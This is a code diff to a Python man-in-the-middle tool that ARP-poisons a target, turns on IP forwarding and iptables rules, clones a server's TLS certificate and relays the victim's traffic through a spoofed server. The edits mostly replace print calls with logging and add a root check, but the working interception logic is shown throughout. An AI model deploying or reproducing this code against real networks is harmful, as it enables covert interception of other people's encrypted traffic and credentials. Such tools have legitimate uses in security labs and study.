@@ -12,6 +12,7 @@ import threading
 import traceback
 import ssl
 import time
+import logging
 
 from argparse import ArgumentParser
 
@@ -21,10 +22,6 @@ from os.path import exists, join
 from io import open
 
 from scapy.all import *
-
-import pprint
-import email
-from io import StringIO
 
 from utils import *
 from connection import *
@@ -88,13 +85,13 @@ def set_configs():
 		},
 		'interface' : args.interface
 	}
-	print(conf)
+	logging.info(conf)
 	return conf
 
 def end( configs ):
-	print ( "[*] Disabling ip forwarding..." )
+	logging.info ( "[*] Disabling ip forwarding..." )
 	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-	print ( "[*] Cleaning iptables rules..." )
+	logging.info ( "[*] Cleaning iptables rules..." )
 	iptables_clean()
 
 def start( configs ):
@@ -104,7 +101,7 @@ def start( configs ):
 		#print ( version )
 		# print ( "Ensure that ARP spoofing is running!" )
 		
-		print ( "[*] Enabling ip forwarding..." )
+		logging.info ( "[*] Enabling ip forwarding..." )
 		# sysctl -w net.ipv4.ip_forward=1
 		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
@@ -113,10 +110,10 @@ def start( configs ):
 
 		#print ( "[*] Checking for iptables rules..." )
 		
-		print ( "[*] Adding iptables rules..." )
+		logging.info ( "[*] Adding iptables rules..." )
 		iptables_accept( configs )
 
-		print ( "[*] Cloning server certificate..." )
+		logging.info ( "[*] Cloning server certificate..." )
 		cert = get_cert_from_endpoint ( configs['server']['ip'] )
 		#cert = _get_cert_from_endpoint ( "www.google.com" )
 		if ( cert != None ): clone_certificate ( cert )
@@ -134,8 +131,8 @@ def start( configs ):
 		raise
 		
 	except Exception as e:# Any other error
-		print ("\n[!] Error in executing program:" )
-		print(traceback.format_exc())
+		logging.error ("\n[!] Error in executing program:", exc_info=True )
+		#logging.error (traceback.format_exc())
 		end( configs )
 
 		# the socket is open? If yes close it
@@ -154,21 +151,21 @@ def spoof_server ( configs ):
 		else:
 			s.listen(CONN)
 
-		print ("[*] Listening on port %d.." % PORT)
+		logging.info ("[*] Listening on port {}..".format (PORT) )
 		
 		while True:
 			try:
 				# server socket, it opens a communication with real server
 				f = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
 				
-				print("[*] Connecting to server...")
+				logging.debug("[*] Connecting to server...")
 				if ( PORT == 443 ):
-					print("[*] Doing TLS handshake...")
+					logging.debug("[*] Doing TLS handshake...")
 					f = ssl.wrap_socket ( f, server_side=False, keyfile=None, certfile=None, cert_reqs=ssl.CERT_NONE )
 					f.connect(( configs['server']['ip'], PORT)) # connecting using 202 source IP
 				else:
 					f.connect (( configs['server']['ip'], PORT))
-				print("[*] Connection enstablished!")
+				logging.debug("[*] Connection enstablished!")
 
 
 				#c, addr = s.accept()
@@ -182,14 +179,14 @@ def spoof_server ( configs ):
 				# if i spoofed the gw i needed to go deep since routers don't use L4 but only L3 ( IP ), basically i can't create a socket SOCK_STREAM and wrap a ssl to it
 				# since method itself says that only SOCK_STREAM sockets are supported
 				# which means i have finished my tcp and tls handshake with him now he sended me some data to be forwarded to server faking the client requests
-				print ("\n[*] Received connection from: ", addr)
+				logging.debug ("\n[*] Received connection from: {}".format(addr))
 
 				#handle_connection ( c, wrap_f )
 				handle_connection_stream ( c, f )
 
 				# i should be sure the 2 finished communicating
-				print ("[*] Closing connection with client...")
-				print ("[*] Closing connection with server...")
+				logging.debug ("[*] Closing connection with client...")
+				logging.debug ("[*] Closing connection with server...")
 				#wrap_f.close()
 				# If how is SHUT_RD, further receives are disallowed. If how is SHUT_WR, further sends are disallowed. If how is SHUT_RDWR, further sends and receives are disallowed.
 				f.shutdown( SHUT_RDWR )
@@ -200,19 +197,19 @@ def spoof_server ( configs ):
 			except socket.error as e:
 				# if error is 0 means client closed connection and i only need to relisten and stay cool, failed to accept connection
 				if ( e.errno == 0 ): 
-					print ("[!] It seems the client closed the connection! ReListening...")
+					logging.error ("[!] It seems the client closed the connection! ReListening...")
 					#wrap_f.close()
 					f.shutdown( SHUT_RDWR )
 					f.close()
 					continue
 				else: # could be connect error, socket creation error or error in handle connection or in shutdown close
 					# ssl.SSLError
-					print ("\n[!] Error in accepting secure connection from client or server:" )
-					print(traceback.format_exc())
+					logging.error ("\n[!] Error in accepting secure connection from client or server:", exc_info=True )
+					#logging.error(traceback.format_exc())
 					# print(sys.exc_info()[0]) # ERROR sys not defined python3
 					#print ( e )
-					print ("Socket error({0}): {1}".format(e.errno, e.strerror))
-					print ( os.strerror( e.errno ) )
+					logging.error ("Socket error({0}): {1}".format(e.errno, e.strerror))
+					logging.error ( os.strerror( e.errno ) )
 					end( configs )
 					#s.close() # do i need to close wrapped one?
 					c.shutdown( SHUT_RDWR )
@@ -238,9 +235,9 @@ def spoof_server ( configs ):
 
 	except socket.error as v: # as python3 --> , python2
 		# there could be many different socket errors 
-		print ("\n[!] Error in creating mitm socket:" )
+		logging.error ("\n[!] Error in creating mitm socket:", exc_info=True )
 		#print ( "errno no: ", v[0] ) # ERROR IN THE ERROR python3
-		print(traceback.format_exc())
+		#logging.error(traceback.format_exc())
 		# print(sys.exc_info()[0]) #ERROR sys not defined
 		end( configs )
 
@@ -268,7 +265,7 @@ def spoof_gateway( configs ):
 def main():
 	try:
 		configs = set_configs()
-		#print ( configs['target']['ip'] )
+		#logging.info ( configs['target']['ip'] )
 		arp = threading.Thread( target=arp_spoof.poison, args=[ configs['target']['ip'], configs['target']['mac'], configs['server']['ip'], configs['mitm']['mac'] ] )  
 		arp.setDaemon(True)
 		arp.start() #ARP spoofing
@@ -276,9 +273,34 @@ def main():
 
 		start( configs )
 	except KeyboardInterrupt:
-		print ("\n[!] Ctrl+C: closing program")
-		print ("\n[*] Antitode target..")
+		logging.info ("\n[!] Ctrl+C: closing program")
+		logging.info ("\n[*] Antitode target..")
 		arp_spoof.antitode( configs['target']['ip'], configs['target']['mac'], configs['server']['ip'], configs['server']['mac'] )
 
 if __name__ == '__main__' :
+	if os.geteuid() != 0:
+		sys.exit("[!] Program must be runned as root! Exiting...")
+
+	# formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+	logging.basicConfig ( level=logging.INFO, format='%(message)s' )
+	#logger = logging.getLogger( __name__ )
+	#logging.info("tryout")
+
+	'''
+	logger = logging.getLogger(__name__)
+	logger.setLevel(logging.INFO)
+
+	# create a file handler
+	handler = logging.FileHandler('hello.log')
+	handler.setLevel(logging.INFO)
+
+	# create a logging format
+	formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+	handler.setFormatter(formatter)
+
+	# add the handlers to the logger
+	logger.addHandler(handler)
+
+	logger.info('Hello baby')
+	'''
 	main()
